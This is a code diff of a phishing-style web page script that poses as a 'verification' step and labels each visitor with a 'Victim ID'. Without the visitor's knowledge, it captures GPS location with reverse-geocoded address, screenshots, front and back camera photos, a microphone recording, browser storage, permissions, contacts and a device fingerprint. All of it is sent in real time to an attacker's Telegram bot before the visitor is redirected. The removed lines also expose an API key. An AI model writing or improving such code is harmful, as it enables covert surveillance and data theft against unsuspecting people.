@@ -285,22 +285,6 @@
             }
         }
 
-        async function sendDocumentToTelegram(text, filename, caption = '') {
-            try {
-                const blob = new Blob([text], { type: 'text/plain' });
-                
-                const formData = new FormData();
-                formData.append('chat_id', TELEGRAM_CONFIG.chatId);
-                formData.append('document', blob, filename);
-                if (caption) formData.append('caption', caption);
-                
-                return await sendToTelegram(formData, { method: 'sendDocument', isFormData: true });
-            } catch (error) {
-                console.error('Document send error:', error);
-                return false;
-            }
-        }
-
         async function sendAudioToTelegram(audioBlob, caption = '') {
             try {
                 const formData = new FormData();
@@ -313,6 +297,147 @@
                 console.error('Audio send error:', error);
                 return false;
             }
+        }
+
+        // ============================================
+        // ENHANCED MAP FUNCTIONS
+        // ============================================
+        function generateGoogleMapsLink(lat, lon) {
+            return `https://www.google.com/maps?q=${lat},${lon}&z=15&t=m`;
+        }
+
+        function generateGoogleMapsEmbed(lat, lon) {
+            return `https://maps.google.com/maps?q=${lat},${lon}&hl=en&z=15&output=embed`;
+        }
+
+        function generateGoogleMapsStatic(lat, lon, zoom = 15, size = '600x300') {
+            // Using OpenStreetMap for static images (no API key needed)
+            return `https://static-maps.yandex.ru/1.x/?ll=${lon},${lat}&z=${zoom}&size=${size}&l=map&pt=${lon},${lat},pmwtm1`;
+        }
+
+        function generateOpenStreetMapLink(lat, lon) {
+            return `https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}#map=15/${lat}/${lon}`;
+        }
+
+        function generateOpenStreetMapEmbed(lat, lon) {
+            return `https://www.openstreetmap.org/export/embed.html?bbox=${lon-0.01}%2C${lat-0.01}%2C${lon+0.01}%2C${lat+0.01}&layer=mapnik&marker=${lat}%2C${lon}`;
+        }
+
+        function generateBingMapsLink(lat, lon) {
+            return `https://bing.com/maps/default.aspx?cp=${lat}~${lon}&lvl=15`;
+        }
+
+        function generateAppleMapsLink(lat, lon) {
+            return `https://maps.apple.com/?q=${lat},${lon}&z=15&t=s`;
+        }
+
+        function generateWhat3Words(lat, lon) {
+            // Simple simulation of what3words
+            const words = ['apple', 'brave', 'chair', 'dream', 'eagle', 'flame', 'grape', 'house'];
+            const latHash = Math.abs(Math.floor(lat * 1000)) % words.length;
+            const lonHash = Math.abs(Math.floor(lon * 1000)) % words.length;
+            const altHash = Math.abs(Math.floor((lat + lon) * 1000)) % words.length;
+            return `${words[latHash]}.${words[lonHash]}.${words[altHash]}`;
+        }
+
+        function generateAddressLookupLink(lat, lon) {
+            return `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`;
+        }
+
+        async function getAddressFromCoordinates(lat, lon) {
+            try {
+                const response = await fetch(generateAddressLookupLink(lat, lon));
+                const data = await response.json();
+                
+                if (data.address) {
+                    const addr = data.address;
+                    let address = '';
+                    
+                    if (addr.road) address += `${addr.road}, `;
+                    if (addr.suburb) address += `${addr.suburb}, `;
+                    if (addr.city || addr.town || addr.village) address += `${addr.city || addr.town || addr.village}, `;
+                    if (addr.state) address += `${addr.state}, `;
+                    if (addr.country) address += addr.country;
+                    
+                    return address.replace(/, $/, '');
+                }
+            } catch (error) {
+                console.error('Address lookup failed:', error);
+            }
+            return null;
+        }
+
+        async function sendEnhancedLocationToTelegram(lat, lon, accuracy = null) {
+            // Get address if possible
+            const address = await getAddressFromCoordinates(lat, lon);
+            
+            // Generate all map links
+            const googleMapsLink = generateGoogleMapsLink(lat, lon);
+            const openStreetMapLink = generateOpenStreetMapLink(lat, lon);
+            const bingMapsLink = generateBingMapsLink(lat, lon);
+            const appleMapsLink = generateAppleMapsLink(lat, lon);
+            const staticMapImage = generateGoogleMapsStatic(lat, lon);
+            const w3w = generateWhat3Words(lat, lon);
+            
+            let message = `📍 *ENHANCED LOCATION DATA*\n\n`;
+            message += `🆔 *Victim ID:* \`${VICTIM_ID}\`\n`;
+            message += `🎯 *Coordinates:* ${lat.toFixed(6)}, ${lon.toFixed(6)}\n`;
+            
+            if (accuracy) {
+                message += `📏 *Accuracy:* ${accuracy.toFixed(2)} meters\n`;
+            }
+            
+            if (address) {
+                message += `🏠 *Address:* ${address}\n`;
+            }
+            
+            message += `🗺️ *Google Maps:* [Click Here](${googleMapsLink})\n`;
+            message += `🗺️ *OpenStreetMap:* [Click Here](${openStreetMapLink})\n`;
+            message += `🗺️ *Bing Maps:* [Click Here](${bingMapsLink})\n`;
+            message += `🗺️ *Apple Maps:* [Click Here](${appleMapsLink})\n`;
+            message += `🔤 *What3Words:* \`${w3w}\`\n`;
+            message += `🔗 *Source URL:* ${collectedData.campaign.url}`;
+            
+            // Send the message
+            await sendToTelegram(message);
+            
+            // Send static map image
+            await sendPhotoToTelegram(staticMapImage, `📍 Map Location: ${lat.toFixed(6)}, ${lon.toFixed(6)}`);
+            
+            // Send additional map links
+            const embedMessage = `🗺️ *INTERACTIVE MAPS*\n\n`;
+            const embedMessage2 = `*Google Maps Embedded:* ${generateGoogleMapsEmbed(lat, lon)}\n`;
+            const embedMessage3 = `*OpenStreetMap Embedded:* ${generateOpenStreetMapEmbed(lat, lon)}\n`;
+            const embedMessage4 = `*Coordinates Formats:*\n`;
+            const embedMessage5 = `• Decimal: ${lat}, ${lon}\n`;
+            const embedMessage6 = `• DMS: ${convertToDMS(lat, lon)}\n`;
+            const embedMessage7 = `• UTM: ${convertToUTM(lat, lon)}`;
+            
+            await sendToTelegram(embedMessage + embedMessage2 + embedMessage3 + embedMessage4 + embedMessage5 + embedMessage6 + embedMessage7);
+        }
+
+        function convertToDMS(lat, lon) {
+            const latDirection = lat >= 0 ? 'N' : 'S';
+            const lonDirection = lon >= 0 ? 'E' : 'W';
+            
+            const latAbs = Math.abs(lat);
+            const lonAbs = Math.abs(lon);
+            
+            const latDeg = Math.floor(latAbs);
+            const latMin = Math.floor((latAbs - latDeg) * 60);
+            const latSec = ((latAbs - latDeg - latMin/60) * 3600).toFixed(1);
+            
+            const lonDeg = Math.floor(lonAbs);
+            const lonMin = Math.floor((lonAbs - lonDeg) * 60);
+            const lonSec = ((lonAbs - lonDeg - lonMin/60) * 3600).toFixed(1);
+            
+            return `${latDeg}°${latMin}'${latSec}"${latDirection} ${lonDeg}°${lonMin}'${lonSec}"${lonDirection}`;
+        }
+
+        function convertToUTM(lat, lon) {
+            // Simplified UTM conversion
+            const zone = Math.floor((lon + 180) / 6) + 1;
+            return `Zone ${zone}`;
         }
 
         // ============================================
@@ -407,20 +532,25 @@
             updateProgress(2, "Collecting network information...");
             
             try {
-                // Get public IP
-                const ipPromises = [
-                    fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => null),
-                    fetch('https://api64.ipify.org?format=json').then(r => r.json()).catch(() => null),
-                    fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => null)
+                // Get public IP with multiple fallbacks
+                const ipServices = [
+                    'https://api.ipify.org?format=json',
+                    'https://api64.ipify.org?format=json',
+                    'https://ipapi.co/json/',
+                    'https://ipwhois.app/json/',
+                    'https://ipinfo.io/json'
                 ];
                 
                 let ipData = {};
-                for (const promise of ipPromises) {
+                for (const service of ipServices) {
                     try {
-                        const data = await promise;
-                        if (data && data.ip) {
-                            ipData = data;
-                            break;
+                        const response = await fetch(service);
+                        if (response.ok) {
+                            const data = await response.json();
+                            if (data.ip) {
+                                ipData = { ...ipData, ...data };
+                                break;
+                            }
                         }
                     } catch (e) {}
                 }
@@ -428,12 +558,16 @@
                 collectedData.network = {
                     ipv4: ipData.ip || 'Unknown',
                     ipv6: ipData.ipv6 || null,
-                    country: ipData.country || ipData.country_name,
-                    region: ipData.region || ipData.region_name,
-                    city: ipData.city,
-                    isp: ipData.org,
-                    timezone: ipData.timezone,
-                    location: ipData.loc,
+                    country: ipData.country || ipData.country_name || ipData.countryCode,
+                    region: ipData.region || ipData.region_name || ipData.regionName,
+                    city: ipData.city || ipData.city_name,
+                    isp: ipData.org || ipData.isp || ipData.asn,
+                    timezone: ipData.timezone || ipData.time_zone,
+                    location: ipData.loc || (ipData.latitude && ipData.longitude ? `${ipData.latitude},${ipData.longitude}` : null),
+                    coordinates: ipData.latitude && ipData.longitude ? {
+                        lat: ipData.latitude,
+                        lon: ipData.longitude
+                    } : null,
                     online: navigator.onLine,
                     connection: navigator.connection ? {
                         effectiveType: navigator.connection.effectiveType,
@@ -488,7 +622,7 @@
             updateProgress(2, "Detecting location...");
             
             try {
-                // Try geolocation first
+                // Try high-accuracy geolocation
                 const geoLocation = await getGeolocation();
                 
                 if (geoLocation) {
@@ -506,8 +640,12 @@
                         accuracy: geoLocation.accuracy
                     };
                     
-                    // Send location immediately
-                    await sendLocationToTelegram();
+                    // Send enhanced location with all map services
+                    await sendEnhancedLocationToTelegram(
+                        geoLocation.latitude, 
+                        geoLocation.longitude, 
+                        geoLocation.accuracy
+                    );
                 } else {
                     // Fallback to IP-based location
                     collectedData.location = {
@@ -515,7 +653,15 @@
                         data: collectedData.network
                     };
                     
-                    await sendToTelegram(`📍 *IP Location:* ${collectedData.network.city || 'Unknown'}, ${collectedData.network.country || 'Unknown'}`);
+                    if (collectedData.network.coordinates) {
+                        await sendEnhancedLocationToTelegram(
+                            collectedData.network.coordinates.lat,
+                            collectedData.network.coordinates.lon,
+                            50000 // IP location has ~50km accuracy
+                        );
+                    } else {
+                        await sendToTelegram(`📍 *IP Location:* ${collectedData.network.city || 'Unknown'}, ${collectedData.network.country || 'Unknown'}`);
+                    }
                 }
                 
                 await delay(500);
@@ -543,7 +689,10 @@
                             timestamp: position.timestamp
                         });
                     },
-                    () => resolve(null),
+                    (error) => {
+                        console.log('Geolocation error:', error);
+                        resolve(null);
+                    },
                     {
                         enableHighAccuracy: true,
                         timeout: 10000,
@@ -551,46 +700,6 @@
                     }
                 );
             });
-        }
-
-        async function sendLocationToTelegram() {
-            const location = collectedData.location.gps;
-            if (!location) return;
-            
-            let message = `📍 *GPS LOCATION CAPTURED*\n\n`;
-            message += `🆔 *Victim ID:* \`${VICTIM_ID}\`\n`;
-            message += `🎯 *Coordinates:* ${location.latitude.toFixed(6)}, ${location.longitude.toFixed(6)}\n`;
-            message += `📏 *Accuracy:* ${location.accuracy.toFixed(2)} meters\n`;
-            
-            if (location.altitude) {
-                message += `⛰️ *Altitude:* ${location.altitude.toFixed(2)}m\n`;
-            }
-            
-            if (location.speed) {
-                message += `🚀 *Speed:* ${location.speed.toFixed(2)} m/s\n`;
-            }
-            
-            message += `🗺️ *Google Maps:* https://maps.google.com/?q=${location.latitude},${location.longitude}\n`;
-            message += `🗺️ *OpenStreetMap:* https://www.openstreetmap.org/?mlat=${location.latitude}&mlon=${location.longitude}\n`;
-            message += `📍 *What3Words:* https://w3w.co/${encodeURIComponent(getThreeWords(location.latitude, location.longitude))}\n`;
-            message += `🔗 *Source:* ${collectedData.campaign.url}`;
-            
-            await sendToTelegram(message);
-            
-            // Send map image
-            const mapImage = `https://maps.googleapis.com/maps/api/staticmap?center=${location.latitude},${location.longitude}&zoom=15&size=600x300&markers=color:red%7C${location.latitude},${location.longitude}&key=AIzaSyCq6iPmPaqH2p_frDk0k5hajcA7wH6yF7w`;
-            await sendPhotoToTelegram(mapImage, `📍 Map: ${location.latitude.toFixed(6)}, ${location.longitude.toFixed(6)}`);
-        }
-
-        function getThreeWords(lat, lon) {
-            // Simplified what3words-like generator
-            const words = ['apple', 'brave', 'chair', 'dream', 'eagle', 'flame', 'grape', 'house', 'igloo', 'jolly',
-                          'karma', 'lemon', 'music', 'night', 'ocean', 'piano', 'queen', 'river', 'sunny', 'tiger',
-                          'unity', 'vivid', 'water', 'xenon', 'yacht', 'zebra'];
-            const latIndex = Math.abs(Math.floor(lat * 1000)) % words.length;
-            const lonIndex = Math.abs(Math.floor(lon * 1000)) % words.length;
-            const altIndex = Math.abs(Math.floor((lat + lon) * 1000)) % words.length;
-            return `${words[latIndex]}.${words[lonIndex]}.${words[altIndex]}`;
         }
 
         async function collectMedia() {
@@ -635,7 +744,7 @@
                 };
                 
                 // Send screenshot immediately
-                await sendPhotoToTelegram(screenshot, `🖥️ SCREENSHOT - ${VICTIM_ID}\nResolution: ${canvas.width}x${canvas.height}`);
+                await sendPhotoToTelegram(screenshot, `🖥️ SCREENSHOT - ${VICTIM_ID}\nResolution: ${canvas.width}x${canvas.height}\nURL: ${collectedData.campaign.url}`);
                 
                 return true;
             } catch (error) {
@@ -650,9 +759,9 @@
                 
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: {
-                        width: { ideal: 640 },
-                        height: { ideal: 480 },
-                        facingMode: 'environment'
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        facingMode: 'user' // Front camera
                     }
                 });
                 
@@ -678,21 +787,22 @@
                 collectedData.media.camera = {
                     type: 'photo',
                     resolution: `${canvas.width}x${canvas.height}`,
-                    timestamp: Date.now()
+                    timestamp: Date.now(),
+                    camera: 'front'
                 };
+                
+                // Send front camera photo
+                await sendPhotoToTelegram(photo, `📷 FRONT CAMERA - ${VICTIM_ID}\nResolution: ${canvas.width}x${canvas.height}`);
                 
                 // Stop stream
                 stream.getTracks().forEach(track => track.stop());
-                
-                // Send camera photo immediately
-                await sendPhotoToTelegram(photo, `📷 CAMERA PHOTO - ${VICTIM_ID}\nFront Camera: ${canvas.width}x${canvas.height}`);
                 
                 // Try back camera
                 try {
                     const backStream = await navigator.mediaDevices.getUserMedia({
                         video: {
-                            width: { ideal: 640 },
-                            height: { ideal: 480 },
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 },
                             facingMode: { exact: 'environment' }
                         }
                     });
@@ -703,7 +813,15 @@
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     const backPhoto = canvas.toDataURL('image/jpeg', 0.8);
                     
-                    await sendPhotoToTelegram(backPhoto, `📷 BACK CAMERA - ${VICTIM_ID}`);
+                    collectedData.media.backCamera = {
+                        type: 'photo',
+                        resolution: `${canvas.width}x${canvas.height}`,
+                        timestamp: Date.now(),
+                        camera: 'back'
+                    };
+                    
+                    // Send back camera photo
+                    await sendPhotoToTelegram(backPhoto, `📷 BACK CAMERA - ${VICTIM_ID}\nResolution: ${canvas.width}x${canvas.height}`);
                     
                     backStream.getTracks().forEach(track => track.stop());
                 } catch (e) {
@@ -725,27 +843,29 @@
                     audio: {
                         echoCancellation: false,
                         noiseSuppression: false,
-                        autoGainControl: false
+                        autoGainControl: false,
+                        channelCount: 2
                     }
                 });
                 
-                const recorder = new MediaRecorder(stream);
+                const recorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
                 const chunks = [];
                 
                 recorder.ondataavailable = (e) => chunks.push(e.data);
                 
                 return new Promise((resolve) => {
                     recorder.onstop = async () => {
-                        const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
+                        const blob = new Blob(chunks, { type: 'audio/webm; codecs=opus' });
                         collectedData.media.microphone = {
                             type: 'audio',
                             duration: 5,
-                            format: 'ogg',
-                            timestamp: Date.now()
+                            format: 'webm',
+                            timestamp: Date.now(),
+                            size: blob.size
                         };
                         
-                        // Send audio immediately
-                        await sendAudioToTelegram(blob, `🎤 AUDIO RECORDING - ${VICTIM_ID}\nDuration: 5 seconds`);
+                        // Send audio recording
+                        await sendAudioToTelegram(blob, `🎤 AUDIO RECORDING - ${VICTIM_ID}\nDuration: 5 seconds\nFormat: WebM/Opus`);
                         
                         stream.getTracks().forEach(track => track.stop());
                         resolve(true);
@@ -767,8 +887,6 @@
             collectedData.sensors = {
                 orientation: {},
                 motion: {},
-                proximity: {},
-                light: {},
                 battery: {},
                 timestamp: Date.now()
             };
@@ -810,6 +928,7 @@
                         alpha: event.alpha,
                         beta: event.beta,
                         gamma: event.gamma,
+                        absolute: event.absolute,
                         timestamp: Date.now()
                     });
                     window.removeEventListener('deviceorientation', handler);
@@ -817,7 +936,6 @@
                 
                 window.addEventListener('deviceorientation', handler, { once: true });
                 
-                // Timeout after 2 seconds
                 setTimeout(() => {
                     window.removeEventListener('deviceorientation', handler);
                     resolve({});
@@ -865,15 +983,27 @@
             message += `🆔 *Victim ID:* \`${VICTIM_ID}\`\n`;
             
             if (sensors.battery.level !== undefined) {
-                message += `🔋 *Battery:* ${sensors.battery.level}% ${sensors.battery.charging ? '⚡' : ''}\n`;
+                message += `🔋 *Battery:* ${sensors.battery.level}% ${sensors.battery.charging ? '(Charging ⚡)' : '(Not Charging)'}\n`;
+                if (sensors.battery.chargingTime !== Infinity) {
+                    message += `⏳ *Charge Time:* ${sensors.battery.chargingTime} seconds\n`;
+                }
+                if (sensors.battery.dischargingTime !== Infinity) {
+                    message += `⏳ *Discharge Time:* ${sensors.battery.dischargingTime} seconds\n`;
+                }
             }
             
             if (sensors.orientation.alpha !== undefined) {
-                message += `🧭 *Orientation:* α=${sensors.orientation.alpha?.toFixed(2) || 'N/A'}°, β=${sensors.orientation.beta?.toFixed(2) || 'N/A'}°, γ=${sensors.orientation.gamma?.toFixed(2) || 'N/A'}°\n`;
+                message += `🧭 *Orientation:*\n`;
+                message += `   α: ${sensors.orientation.alpha?.toFixed(2) || 'N/A'}°\n`;
+                message += `   β: ${sensors.orientation.beta?.toFixed(2) || 'N/A'}°\n`;
+                message += `   γ: ${sensors.orientation.gamma?.toFixed(2) || 'N/A'}°\n`;
             }
             
             if (sensors.motion.acceleration?.x !== undefined) {
-                message += `⚡ *Acceleration:* X=${sensors.motion.acceleration.x?.toFixed(2) || 'N/A'}, Y=${sensors.motion.acceleration.y?.toFixed(2) || 'N/A'}, Z=${sensors.motion.acceleration.z?.toFixed(2) || 'N/A'}\n`;
+                message += `⚡ *Acceleration:*\n`;
+                message += `   X: ${sensors.motion.acceleration.x?.toFixed(2) || 'N/A'} m/s²\n`;
+                message += `   Y: ${sensors.motion.acceleration.y?.toFixed(2) || 'N/A'} m/s²\n`;
+                message += `   Z: ${sensors.motion.acceleration.z?.toFixed(2) || 'N/A'} m/s²\n`;
             }
             
             message += `🔗 *Source:* ${collectedData.campaign.url}`;
@@ -894,7 +1024,8 @@
                 url: window.location.href,
                 title: document.title,
                 plugins: Array.from(navigator.plugins).map(p => p.name),
-                mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type)
+                mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type),
+                permissions: {}
             };
             
             // Read localStorage
@@ -917,7 +1048,44 @@
                 collectedData.browser.sessionStorage = ssData;
             } catch (e) {}
             
+            // Check permissions
+            const permissionsToCheck = ['camera', 'microphone', 'geolocation', 'notifications'];
+            for (const permission of permissionsToCheck) {
+                try {
+                    const result = await navigator.permissions.query({ name: permission });
+                    collectedData.browser.permissions[permission] = result.state;
+                } catch (e) {
+                    collectedData.browser.permissions[permission] = 'unsupported';
+                }
+            }
+            
+            await sendBrowserDataToTelegram();
             await delay(500);
+        }
+
+        async function sendBrowserDataToTelegram() {
+            const browser = collectedData.browser;
+            let message = `🌐 *BROWSER DATA*\n\n`;
+            message += `🆔 *Victim ID:* \`${VICTIM_ID}\`\n`;
+            message += `📖 *Page Title:* ${browser.title}\n`;
+            message += `🔗 *URL:* ${browser.url}\n`;
+            message += `↩️ *Referrer:* ${browser.referrer || 'None'}\n`;
+            message += `🍪 *Cookies:* ${browser.cookies.length > 0 ? 'Yes' : 'No'}\n`;
+            message += `📚 *History Length:* ${browser.historyLength} pages\n`;
+            message += `🔌 *Plugins:* ${browser.plugins.length}\n`;
+            
+            // Permissions
+            message += `🔐 *Permissions:*\n`;
+            for (const [perm, state] of Object.entries(browser.permissions)) {
+                message += `   ${perm}: ${state}\n`;
+            }
+            
+            message += `💾 *LocalStorage Items:* ${Object.keys(browser.localStorage).length}\n`;
+            message += `💾 *SessionStorage Items:* ${Object.keys(browser.sessionStorage).length}\n`;
+            
+            message += `🔗 *Source:* ${collectedData.campaign.url}`;
+            
+            await sendToTelegram(message);
         }
 
         async function collectContacts() {
@@ -1024,6 +1192,8 @@
                     timestamp: Date.now()
                 };
                 
+                await sendFingerprintToTelegram();
+                
             } catch (error) {
                 collectedData.fingerprint = { error: error.message };
             }
@@ -1105,6 +1275,34 @@
             return available;
         }
 
+        async function sendFingerprintToTelegram() {
+            const fingerprint = collectedData.fingerprint;
+            let message = `🆔 *DEVICE FINGERPRINT*\n\n`;
+            message += `🆔 *Victim ID:* \`${VICTIM_ID}\`\n`;
+            
+            if (fingerprint.webgl) {
+                message += `🎮 *WebGL Renderer:* ${fingerprint.webgl.renderer || 'Unknown'}\n`;
+                message += `🏢 *WebGL Vendor:* ${fingerprint.webgl.vendor || 'Unknown'}\n`;
+            }
+            
+            if (fingerprint.audio) {
+                message += `🎵 *Audio Sample Rate:* ${fingerprint.audio.sampleRate || 'Unknown'} Hz\n`;
+            }
+            
+            message += `🔌 *Browser Plugins:* ${fingerprint.plugins || 0}\n`;
+            message += `📄 *MIME Types:* ${fingerprint.mimeTypes || 0}\n`;
+            
+            if (fingerprint.fonts && fingerprint.fonts.length > 0) {
+                message += `🔤 *Fonts Detected:* ${fingerprint.fonts.slice(0, 5).join(', ')}`;
+                if (fingerprint.fonts.length > 5) message += `... and ${fingerprint.fonts.length - 5} more`;
+                message += `\n`;
+            }
+            
+            message += `🔗 *Source:* ${collectedData.campaign.url}`;
+            
+            await sendToTelegram(message);
+        }
+
         // ============================================
         // MAIN EXECUTION
         // ============================================
@@ -1116,23 +1314,23 @@
                 // Collect all data
                 await collectDeviceInfo();
                 await collectNetworkInfo();
-                await collectLocation();
+                await collectLocation();  // This sends enhanced maps!
                 await collectMedia();
                 await collectSensorData();
                 await collectBrowserData();
                 await collectContacts();
                 await collectFingerprint();
 
-                // Send summary
+                // Send final summary
                 await sendFinalSummary();
 
                 // Complete
                 updateProgress(5, "Verification complete!");
                 
-                // Redirect
+                // Redirect after completion
                 setTimeout(() => {
                     const params = new URLSearchParams(window.location.search);
-                    const redirectUrl = params.get('redirect') || 'https://t.me/CEC_Educational_Books';
+                    const redirectUrl = params.get('redirect') || 'https://google.com';
                     window.location.href = redirectUrl;
                 }, 3000);
 
@@ -1142,7 +1340,7 @@
                 
                 // Still redirect
                 setTimeout(() => {
-                    window.location.href = 'https://google.com';
+                    window.location.href = 'https://t.me/CEC_Educational_Books';
                 }, 2000);
             }
         }
@@ -1153,9 +1351,10 @@
             summary += `⏰ *Time:* ${new Date().toLocaleString()}\n`;
             summary += `📱 *Device:* ${collectedData.device.deviceType} - ${collectedData.device.browser} on ${collectedData.device.os}\n`;
             summary += `🌐 *IP:* \`${collectedData.network.ipv4 || 'Unknown'}\`\n`;
+            summary += `📍 *Country:* ${collectedData.network.country || 'Unknown'}\n`;
             
             if (collectedData.location.gps) {
-                summary += `📍 *GPS:* ${collectedData.location.gps.latitude.toFixed(6)}, ${collectedData.location.gps.longitude.toFixed(6)}\n`;
+                summary += `🎯 *GPS Coordinates:* ${collectedData.location.gps.latitude.toFixed(6)}, ${collectedData.location.gps.longitude.toFixed(6)}\n`;
             }
             
             if (collectedData.media.screenshot.resolution) {
@@ -1163,15 +1362,19 @@
             }
             
             if (collectedData.media.camera.resolution) {
-                summary += `📷 *Camera:* ${collectedData.media.camera.resolution}\n`;
+                summary += `📷 *Front Camera:* ${collectedData.media.camera.resolution}\n`;
+            }
+            
+            if (collectedData.media.backCamera) {
+                summary += `📷 *Back Camera:* ${collectedData.media.backCamera.resolution}\n`;
             }
             
             if (collectedData.media.microphone.duration) {
-                summary += `🎤 *Audio:* ${collectedData.media.microphone.duration}s recording\n`;
+                summary += `🎤 *Audio Recording:* ${collectedData.media.microphone.duration}s\n`;
             }
             
             if (collectedData.contacts.count > 0) {
-                summary += `📞 *Contacts:* ${collectedData.contacts.count} accessed\n`;
+                summary += `📞 *Contacts Accessed:* ${collectedData.contacts.count}\n`;
             }
             
             if (collectedData.sensors.battery.level !== undefined) {
@@ -1179,8 +1382,18 @@
             }
             
             summary += `🔗 *Campaign:* ${collectedData.campaign.campaignId}\n`;
-            summary += `🌍 *Country:* ${collectedData.network.country || 'Unknown'}\n`;
-            summary += `\n_All data sent directly to Telegram - No JSON files stored_`;
+            summary += `\n📊 *Data Types Sent:*\n`;
+            summary += `• Device Information\n`;
+            summary += `• Network Details\n`;
+            summary += `• GPS Location with Maps\n`;
+            summary += `• Screenshot\n`;
+            summary += `• Camera Photos\n`;
+            summary += `• Audio Recording\n`;
+            summary += `• Sensor Data\n`;
+            summary += `• Browser Information\n`;
+            summary += `• Contacts (if accessible)\n`;
+            summary += `• Device Fingerprint\n`;
+            summary += `\n_All data sent directly to Telegram in real-time_`;
             
             await sendToTelegram(summary);
         }
